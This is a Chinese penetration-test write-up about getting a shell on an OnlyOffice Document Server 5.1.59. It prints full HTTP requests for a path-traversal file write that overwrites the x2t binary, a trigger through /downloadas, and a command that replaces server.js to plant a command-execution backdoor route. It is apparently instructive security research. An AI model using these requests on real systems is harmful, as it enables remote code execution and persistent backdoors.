#  记一次曲折的onlyoffice漏洞利用，成功getshell！  
xinca0Zzz
                    xinca0Zzz  菜鸟学信安   2026-10-01 00:30  
  
文章作者：  
xinca0Zzz  
  
文章来源：  
https://forum.butian.net/share/4943  
  
## 前言  
  
某天白天，有位好兄弟突然问我，手上有个授权的目标有无空闲帮忙看看，正好那时的我因为下雨被困室内只能尽点绵薄之力。 后续发现下雨是对的，这次较为曲折的漏洞挖掘和思路拓展让我逐渐生锈的脑子开始了转动（头好痒哦）  
### 渗透阶段  
  
前期一系列的信息收集诸如域名，icp、子域名等等手段暂且不提，反正最终找到了下面的资产  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/mcko8AHj6QXxRwSq0FuQSyFicAkFPNSfWP0BgFPEjwW5qjANavrJUQN80BiaxMQXibxsPcTm929LIPyTFV83BPjHB7vQXTlSmaWOSdn4QTPfhY/640?wx_fmt=png&from=appmsg#imgIndex=2 "")  
话不多说，直接开始history vuln尝试一波  
```
POST /savefile/1?cmd={"id":1,"outputpath":"../../../../../../../../var/www/onlyoffice/documentserver/server/welcome/111.txt"} HTTP/1.1Host: xxxCookie: LRToken=Sec-Ch-Ua: "Chromium";v="127", "Not)A;Brand";v="99"Sec-Ch-Ua-Mobile: ?0Sec-Ch-Ua-Platform: "macOS"Accept-Language: zh-CNUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Sec-Fetch-Site: noneSec-Fetch-Mode: navigateSec-Fetch-User: ?1Sec-Fetch-Dest: documentAccept-Encoding: gzip, deflate, brPriority: u=0, iConnection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 3xxx
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/AFjuWEpVxUKZUInYPQ9UpCY4Iey0sIb1ekW2mAbDIlWicC3zg7sEhyMH7F318k0Rqd0xJ1Y3Q9psR2B1wdHEm2VZiaKZ6L2XWc0nXSFkcxVBg/640?wx_fmt=png&from=appmsg "")  
  
哦吼，有戏（开始的我以为已经结束了）  
#### 覆盖原始web文件注册路由  
  
传统的onlyoffice利用如下： 项目运行的express的用户为ds, web下的文件所属用户也都为ds，那么可以通过覆盖web的一些文件实现RCE  
1. 覆盖js文件，新增路由实现RCE，但是比较麻烦的是node需要重启才会加载上新增的路由（无法实现）  
  
1. 通过覆盖模板文件再通过SSTI RCE，覆盖模板文件后不需要重启服务即可利用（未使用模版）  
  
1. 是否存在命令执行调用elf的路由，通过任意文件写覆盖elf来实现命令执行 这里我们使用3方法来尝试RCE 查看本次项目的onlyoffice是5.1.59版本。去github找到对应源码  
  
![](https://mmbiz.qpic.cn/mmbiz_png/AFjuWEpVxUKrqX6DbrpTez0Modadew2H27maPw2hRvwicOibpFbyqOvADV8J9oTOibjyukyTuicx2x8dLoug2Y6Iia1q2geHOVRYMmfKw9ibVNptw/640?wx_fmt=png&from=appmsg "")  
  
在已公布的利用poc里，docbuilder  
路由实现的方法如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/AFjuWEpVxUJX7uZLQR4jBQ5hqfgrBwPWbdbplQslQe7VF26SbkBk8MqTMce6Jy5icAIEMfR7SgZBPJvZCLArfxCgDbtE3q9KBqKSxLYRSNhE/640?wx_fmt=png&from=appmsg "")  
  
调用addTask  
方法，将生成doc的任务加到队列  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/AFjuWEpVxUKOicmuktGaeHcXGCpEreRKwgt4emT36zpcS3ZB62vygMDVxAG8PVs4Yica0BJWHHEt2tLlyUL1LTiblEDg25P4vE3FKibdkK4WHFI/640?wx_fmt=png&from=appmsg "")  
  
在接收到任务后，调用ExecuteTask  
方法，执行  
  
![](https://mmbiz.qpic.cn/mmbiz_png/AFjuWEpVxULdrHJ1kWKMribl1xnsibeGP6QjW4B2lzutwPDO3FRvEo0mnRQyTAzD83svQtSteAHeTGLbZJPj8IzLduSlf1TS73QF381VAXkms/640?wx_fmt=png&from=appmsg "")  
  
在ExecuteTask  
方法中，会通过spawnAsync  
命令执行方法调用/var/www/onlyoffice/documentserver/server/FileConverter/bin/docbuilder ELF  
二进制文件来生成文档，docbuilder  
文件所属用户也是ds，那么可以通过之前的文件写漏洞覆盖掉docbuilder ELF  
，再通过docbuilder  
路由触发我们上传覆盖的ELF  
#### 利用之路漫漫  
  
然而在执行过程中，死活无法成功执行，迫不得已我只能再去仔细阅读一次源码，看看到底是怎么个事。 找到5.1.5.59版本源码查看一番发现  
```
app.post('/docbuilder', utils.checkClientIp, rawFileParser, (req, res) => {            const licenseInfo = docsCoServer.getLicenseInfo();            if (licenseInfo.type !== constants.LICENSE_RESULT.Success) {                logger.error('License expired');                res.sendStatus(402);                return;            }            converterService.builder(req, res);        });
```  
  
此版本有一个判断，如果licenseInfo  
类型不为True，则无法执行builder的方法。而在DocsCoServer.js  
当中，licenseInfo  
写死为Error  
，所以无法执行converterService.builder  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/AFjuWEpVxUKPJZXJPoFUFicmQuvpoCRWsIe5AKg5vr4Ww1SXqfTBO44Lwng0CS7Mk6qoiapb7NHzKNadj1lQrs7YYaYibdBLvpq8Qtat2B6q7Q/640?wx_fmt=png&from=appmsg "")  
  
上述的利用链路就无法使用了（TM的甘），所以还能怎么办呢，这时我的脑子非常的痒，挠的时候无意中发现在源码的bin目录里，还存在一个x2t  
的elf文件，这时我想如果我们能够上传并覆盖其内容，并能够执行它，是不是就能达到同样的目的。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/AFjuWEpVxUIXicsw4YpFyP99ic1cuicNsTu5yXPQAlPjHIwNaerfwOib2YOqZMmwQblEITu9nkfl4QFZEIz74IboeXzX8WFcWLibQ9yUdZE2VvII/640?wx_fmt=png&from=appmsg "")  
  
#### 开始扩展审计  
  
回到触发命令执行的地方，具体看看代码：  
```
function* ExecuteTask(task) {  var startDate = null;  var curDate = null;  if(clientStatsD) {    startDate = curDate = new Date();  }  var resData;  var tempDirs;  var getTaskTime = new Date();  var cmd = task.getCmd();  var dataConvert = new TaskQueueDataConvert(task);  logger.debug('Start Task(id=%s)', dataConvert.key);  var error = constants.NO_ERROR;  tempDirs = getTempDir();  let fileTo = task.getToFile();  dataConvert.fileTo = fileTo ? path.join(tempDirs.result, fileTo) : '';  let isBuilder = cmd.getIsBuilder();  if (cmd.getUrl()) {    dataConvert.fileFrom = path.join(tempDirs.source, dataConvert.key + '.' + cmd.getFormat());    var isDownload = yield* downloadFile(dataConvert.key, cmd.getUrl(), dataConvert.fileFrom);    if (!isDownload) {      error = constants.CONVERT_DOWNLOAD;    }    if(clientStatsD) {      clientStatsD.timing('conv.downloadFile', new Date() - curDate);      curDate = new Date();    }  } else if (cmd.getSaveKey()) {    yield* downloadFileFromStorage(cmd.getDocId(), cmd.getDocId(), tempDirs.source);    logger.debug('downloadFileFromStorage complete(id=%s)', dataConvert.key);    if(clientStatsD) {      clientStatsD.timing('conv.downloadFileFromStorage', new Date() - curDate);      curDate = new Date();    }    error = yield* processDownloadFromStorage(dataConvert, cmd, task, tempDirs);  } else if (cmd.getForgotten()) {    yield* downloadFileFromStorage(cmd.getDocId(), cmd.getForgotten(), tempDirs.source);    logger.debug('downloadFileFromStorage complete(id=%s)', dataConvert.key);    let list = yield utils.listObjects(tempDirs.source, false);    if (list.length > 0) {      dataConvert.fileFrom = list[0];      var forgottenMarkPath = tempDirs.result + '/' + cfgForgottenFilesName + '.txt';      fs.writeFileSync(forgottenMarkPath, cfgForgottenFilesName, {encoding: 'utf8'});    } else {      error = constants.UNKNOWN;    }  } else if (isBuilder) {    yield* downloadFileFromStorage(cmd.getDocId(), cmd.getDocId(), tempDirs.source);    logger.debug('downloadFileFromStorage complete(id=%s)', dataConvert.key);    let list = yield utils.listObjects(tempDirs.source, false);    if (list.length > 0) {      dataConvert.fileFrom = list[0];    }  } else {    error = constants.UNKNOWN;  }  var childRes = null;  let isTimeout = false;  if (constants.NO_ERROR === error) {    if(constants.AVS_OFFICESTUDIO_FILE_OTHER_HTMLZIP === dataConvert.formatTo && cmd.getSaveKey() && !dataConvert.mailMergeSend) {      yield utils.pipeFiles(dataConvert.fileFrom, dataConvert.fileTo);    } else {      var childArgs;      if (cfgArgs.length > 0) {        childArgs = cfgArgs.trim().replace(/  +/g, ' ').split(' ');      } else {        childArgs = [];      }      let processPath;      if (!isBuilder) {        processPath = cfgX2tPath;        let paramsFile = path.join(tempDirs.temp, 'params.xml');        let hiddenXml = dataConvert.serialize(paramsFile);        childArgs.push(paramsFile);        if (hiddenXml) {          childArgs.push(hiddenXml);        }      } else {        fs.mkdirSync(path.join(tempDirs.result, 'output'));        processPath = cfgDocbuilderPath;        childArgs.push('--all-fonts-path=' + cfgDocbuilderAllFontsPath);        childArgs.push('--save-use-only-names=' + tempDirs.result + '/output');        childArgs.push(dataConvert.fileFrom);      }      let timeoutId;      try {        let spawnAsyncPromise = spawnAsync(processPath, childArgs);        childRes = spawnAsyncPromise.child;        let waitMS = task.getVisibilityTimeout() * 1000 - (new Date().getTime() - getTaskTime.getTime());        timeoutId = setTimeout(function() {          isTimeout = true;          timeoutId = undefined;          childRes.stdin.end();          childRes.stdout.destroy();          childRes.stderr.destroy();          childRes.kill();        }, waitMS);        childRes = yield spawnAsyncPromise;      } catch (err) {        let fLog = null === err.status ? logger.error : logger.debug;        fLog.call(logger, 'error spawnAsync(id=%s)\r\n%s', cmd.getDocId(), err.stack);        childRes = err;      }      if (undefined !== timeoutId) {        clearTimeout(timeoutId);      }    }    if(clientStatsD) {      clientStatsD.timing('conv.spawnSync', new Date() - curDate);      curDate = new Date();    }  }  resData = yield* postProcess(cmd, dataConvert, tempDirs, childRes, error, isTimeout);  logger.debug('postProcess (id=%s)', dataConvert.key);  if(clientStatsD) {    clientStatsD.timing('conv.postProcess', new Date() - curDate);    curDate = new Date();  }  if (tempDirs) {    deleteFolderRecursive(tempDirs.temp);    logger.debug('deleteFolderRecursive (id=%s)', dataConvert.key);    if(clientStatsD) {      clientStatsD.timing('conv.deleteFolderRecursive', new Date() - curDate);      curDate = new Date();    }  }  if(clientStatsD) {    clientStatsD.timing('conv.allconvert', new Date() - startDate);  }  return resData;}
```  
  
以看到spawnAsync  
方法接受两个参数，processPath  
为执行的文件路径，childArgs  
为执行的参数，之前分析docbuilder  
可知，该方法会接受之前我们添加入队列任务的可执行文件完整路径去进行执行  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/AFjuWEpVxUJJgCO7KLiczEibwaSgf6qCvnvYa5a4fOfbtKcQpEWRotkYw3a4rz6bWgkKD19rSPia1ibgPK4GaiaRILTNKrcYe5JgHwa0FEFb3wRk/640?wx_fmt=png&from=appmsg "")  
  
在进入执行方法前，processPath  
有个判断，如果isBuilder  
为false，则为cfgX2tPath  
，否则为cfgDocBuilderPath  
。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/AFjuWEpVxUIEp7MGVk2Tj02p1MnHyo9G8al8sRqmfo6nwqBoD5PkLNrRBjwCNR5hlH83L8mznvOoL49CG5NzXISPH23S6wRGa1VU7II7noE/640?wx_fmt=png&from=appmsg "")  
  
可以看到cfgX2tPath  
就是x2t  
文件路径，所以只要满足if (!isBuilder)  
 就可以执行x2t文件了。  
```
var cmd = task.getCmd();getCmd : function() {    return this['cmd'];  },let isBuilder = cmd.getIsBuilder();getIsBuilder: function() {    return this['isbuilder'];  },
```  
  
如果task  
对象里的isbuilder  
属性也就是cmd对象里的isbuilder  
属性不存在或者为False，就能够进行x2t的执行流程。  
  
在canvasservice.js  
里：  
```
function* commandSave(cmd, outputData) {  var completeParts = yield* saveParts(cmd, "Editor.bin");  if (completeParts) {    var queueData = getSaveTask(cmd);    yield* docsCoServer.addTask(queueData, constants.QUEUE_PRIORITY_LOW);  }  outputData.setStatus('ok');  outputData.setData(cmd.getSaveKey());}
```  
  
commandSave方法（Generator 函数）会使用docsCoServer.addTask  
将任务添加到执行队列里，需要completeParts  
为True  
```
function* saveParts(cmd, filename) {  var result = false;  var saveType = cmd.getSaveType();  if (SAVE_TYPE_COMPLETE_ALL !== saveType) {    let ext = pathModule.extname(filename);    filename = pathModule.basename(filename, ext) + (cmd.getSaveIndex() || '') + ext;  }  if ((SAVE_TYPE_PART_START === saveType || SAVE_TYPE_COMPLETE_ALL === saveType) && !cmd.getSaveKey()) {    yield* addRandomKeyTaskCmd(cmd);  }  if (cmd.getUrl()) {    result = true;  } else {    var buffer = cmd.getData();    yield storage.putObject(cmd.getSaveKey() + '/' + filename, buffer, buffer.length);    cmd.data = null;    result = (SAVE_TYPE_COMPLETE_ALL === saveType || SAVE_TYPE_COMPLETE === saveType);  }  return result;}
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/AFjuWEpVxUKJyicEEzahgJnWibJvibicNCyIATTNkSkrY9ibNzO5uACEGvArUgK2AI1dGJT5CW7B3M1gsumnwIgYbdEvkNia4Je5oFjK6YjD8cCyQ/640?wx_fmt=png&from=appmsg "")  
  
分析可知，如果cmd对象参数里存在url，则直接返回true，或者如果saveType等于3或者4，也能返回true进入后续执行的逻辑。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/AFjuWEpVxULlFXCxibdYEXzqYweRiaRW9rG6JktnPD4rzdf2Qa7emEj843aflTgu4rz2HvK005ibjowxBbLBE0eMfgu4eGQwwURpGrlxWpkNu4/640?wx_fmt=png&from=appmsg "")  
  
downloadAs函数里的协程调度器co会驱动调度我们的commandSave  
方法，只要满足cmd对象里c属性为save  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/AFjuWEpVxUKLoT7e7bs0Puh5Lf2GL8dOFkO4eiaYOHVDdvFyqhYoePbQ9HEyToPRVtAL2aYiaYQcnBRRDJjsUGOpp1ZmueSjqk7hhFEgcFxkA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/AFjuWEpVxUL7m0vOo0Naq9t1ibzRJ6iaFtLF28nGiaRictuHouztUeA3W7G4k9fn0BWxdlm3TKgdgRIp1SicRIbueL4nzb42fQYd3SVXG3cHpv4g/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/AFjuWEpVxUJmrcNSoOQYEv7SIWEW7xdnyIF0Svx1zeTZJVEEEcXbHDGm0gnSU95rbZmJf8mKPibEVTCj0eanx63riaA3E4sHUTX8QankxJFD0/640?wx_fmt=png&from=appmsg "")  
  
接口调用为/downloadas/xx，综合构造只要满足cmd对象里c属性为save，id属性不为空，saveType属性为3或4即可执行x2t文件  
#### 漏洞再利用  
  
先覆盖x2t elf文件内容  
```
POST /savefile/1?cmd={"id":1,"outputpath":"../../../../../../../../var/www/onlyoffice/documentserver/server/FileConverter/bin/x2t"} HTTP/1.1Host: xxxAccept-Language: zh-CNUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflate, brConnection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 71echo "1234" > /var/www/onlyoffice/documentserver/server/welcome/123.txt
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/AFjuWEpVxUK99I6TBjSsBCibb6MfwBPuA93ptnibJwBqt5LTglgkGtOoDLlyrW85EOXmZiaEic34QEWT6moeTljaibaUZIoBgZF2BrhUZZkoSEXM/640?wx_fmt=png&from=appmsg "")  
  
调用执行接口：  
```
POST /downloadas/1?cmd={"c":"save","id":"123456","savetype":3} HTTP/1.1Host: xxxAccept-Language: zh-CNUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflate, brConnection: keep-aliveContent-Type: application/jsonContent-Length: 0
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/AFjuWEpVxUJtVM1XGIUX35ojXLumibWgXQlSfelXjibicibp2OAMQQo0jR8uY0arH2ibw4ZKIsFyecTOhzlibtqjtI3dONmd56wRpRaJ8ZbAWaYZs/640?wx_fmt=png&from=appmsg "")  
  
查看结果：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/AFjuWEpVxUL1CqpgNgy2Tm0zKvuziaXG0unztmhMscic3d3kXphUmJNXzyF9Td8GX1qiaenWQC0MBjxIIOD6ktB396wkgxukmooJp53ibF42Hho/640?wx_fmt=png&from=appmsg "")  
  
#### 稳定RCE  
  
虽然最终已经可以执行命令了，但是每次执行都要这样三部曲实在过于麻烦，我们可以覆盖server文件，增加一个直接调用命令的路由，这样通过调用自己编写的路由直接RCE更加方便  
```
POST /savefile/1?cmd={"id":1,"outputpath":"../../../../../../../../var/www/onlyoffice/documentserver/server/FileConverter/bin/x2t"} HTTP/1.1Host: xxxUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Sec-Fetch-Site: noneSec-Fetch-Mode: navigateSec-Fetch-User: ?1Sec-Fetch-Dest: documentSec-Ch-Ua: "Chromium";v="127", "Not)A;Brand";v="99"Sec-Ch-Ua-Mobile: ?0Sec-Ch-Ua-Platform: "macOS"Accept-Language: zh-CNAccept-Encoding: gzip, deflate, brPriority: u=0, iConnection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 67cp /var/www/onlyoffice/documentserver/server/DocService/sources/server.js /var/www/onlyoffice/documentserver/server/DocService/server.js;rm -rf /var/www/onlyoffice/documentserver/server/DocService/sources/server.js;echo "xxxxx" | base64 -d > /var/www/onlyoffice/documentserver/server/DocService/sources/server.js;/usr/bin/supervisorctl restart onlyoffice-documentserver:docservice
```  
  
上述请求就是备份原server文件并删除，上传我们添加路由的server.js，利用原本的服务重启express进程（这里需要寻找服务进程地址，篇幅原因省略了），这样我们就能访问接口直接RCE了 执行：  
```
POST /downloadas/1?cmd={"c":"save","id":"123456","savetype":3} HTTP/1.1Host: xxxUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Sec-Fetch-Site: noneSec-Fetch-Mode: navigateSec-Fetch-User: ?1Sec-Fetch-Dest: documentSec-Ch-Ua: "Chromium";v="127", "Not)A;Brand";v="99"Sec-Ch-Ua-Mobile: ?0Sec-Ch-Ua-Platform: "macOS"Accept-Language: zh-CNAccept-Encoding: gzip, deflate, brPriority: u=0, iConnection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 0
```  
  
RCE:  
```
POST /execCommand.json HTTP/1.1Host: xxxUpgrade-Insecure-Requests: 1cmd: lsUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Sec-Fetch-Site: noneSec-Fetch-Mode: navigateSec-Fetch-User: ?1Sec-Fetch-Dest: documentSec-Ch-Ua: "Chromium";v="127", "Not)A;Brand";v="99"Sec-Ch-Ua-Mobile: ?0Sec-Ch-Ua-Platform: "macOS"Accept-Language: zh-CNAccept-Encoding: gzip, deflate, brPriority: u=0, iConnection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 0
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/AFjuWEpVxUJJa621OY2ZHIqUFPt1MFGYR56gDvicjOeOrI39IKAMDAiafC6E4OxicKpxxvezV1mogXu4aw2UiaLWESOqRRAEKibJHXw1mk6MPMrU/640?wx_fmt=png&from=appmsg "")  
  
至此我的头也不痒了，雨也不下了，晚上正好去江边溜达溜达  
  
  
